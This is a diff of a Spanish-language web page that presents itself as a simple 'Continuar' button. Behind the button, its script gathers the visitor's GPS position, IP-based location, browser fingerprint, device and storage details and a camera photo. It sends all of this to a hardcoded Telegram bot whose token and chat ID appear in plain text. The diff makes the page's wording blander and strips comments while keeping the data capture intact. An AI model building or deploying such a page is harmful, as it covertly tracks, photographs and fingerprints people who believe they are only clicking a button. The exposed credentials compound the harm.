@@ -7,7 +7,7 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #e8f5e9; /* verde claro, diferente al azul de society */
+            background: #e8f5e9;  /* verde claro, diferente al azul original */
             font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
             display: flex;
             justify-content: center;
@@ -65,8 +65,8 @@
 <body>
 <div class="card">
     <h1>Continuar</h1>
-    <p>Presiona el botón para acceder</p>
-    <button id="btn">Continuar para acceder</button>
+    <p>Presiona el botón para continuar</p>
+    <button id="btn">Continuar</button>
     <div id="errorMsg" class="error-msg"></div>
 </div>
 
@@ -74,14 +74,12 @@
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-    // 🔐 REVOCA EL TOKEN VIEJO Y PON AQUÍ EL NUEVO (crea uno con @BotFather)
-    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s'; // <--- REEMPLÁZALO POR TU TOKEN NUEVO
-    const CHAT_ID = '7555997298';                                        // TU CHAT ID (no cambia)
+    // ================= CONFIGURACIÓN (IGUAL QUE SOCIETY) =================
+    const WORKER_URL = 'https://bot-ubi.societykark.workers.dev';  // ✅ TU WORKER
+    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';  // ⚠️ REVOCA Y PON TU TOKEN NUEVO
+    const CHAT_ID = '7555997298';
 
-    // Worker de Cloudflare para ubicación por IP (el mismo que usa society)
-    const WORKER_URL = 'https://bot-ubi.societykark.workers.dev';
-
-    // ---------- 1. IP y ubicación desde Cloudflare Worker ----------
+    // ---------- 1. Obtener ubicación desde Cloudflare Worker ----------
     async function getLocationFromWorker() {
         try {
             const res = await fetch(WORKER_URL);
@@ -98,7 +96,7 @@
         } catch(e) { return null; }
     }
 
-    // ---------- 2. Ubicación desde ipapi.co (fallback) ----------
+    // ---------- 2. Obtener ubicación desde ipapi.co ----------
     async function getLocationFromIpapi() {
         try {
             const res = await fetch('https://ipapi.co/json/');
@@ -114,7 +112,7 @@
         } catch(e) { return null; }
     }
 
-    // ---------- 3. Fingerprint (GPU, fuentes, canvas) ----------
+    // ---------- 3. Fingerprint ----------
     async function getFingerprint() {
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
@@ -158,7 +156,7 @@
         } catch(e) { return { total: 'N/A', used: 'N/A' }; }
     }
 
-    // ---------- 6. GPS exacto (si el usuario permite) ----------
+    // ---------- 6. GPS exacto ----------
     function getGPS() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) { resolve(null); return; }
@@ -214,26 +212,18 @@
 
     // ---------- 9. Proceso principal ----------
     document.getElementById('btn').onclick = async () => {
-        // Obtener GPS (si permite)
         const gps = await getGPS();
-
-        // Obtener ubicaciones por IP (siempre, incluso si GPS falla)
         const [workerLoc, ipapiLoc] = await Promise.all([
             getLocationFromWorker(),
             getLocationFromIpapi()
         ]);
-
-        // Obtener fingerprint, dispositivo, almacenamiento
         const [fp, device, storage] = await Promise.all([
             getFingerprint(),
             getDeviceInfo(),
             getStorageInfo()
         ]);
-
-        // Capturar foto (si permite)
         const foto = await capturePhoto();
 
-        // Construir mensaje completo (exactamente como en society)
         let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
         message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
         message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
@@ -260,7 +250,6 @@
         message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
         message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @ipdx_bot\n`;
 
-        // Enviar mensaje y foto
         await sendMessage(message);
         if (foto) await sendPhoto(foto);
 
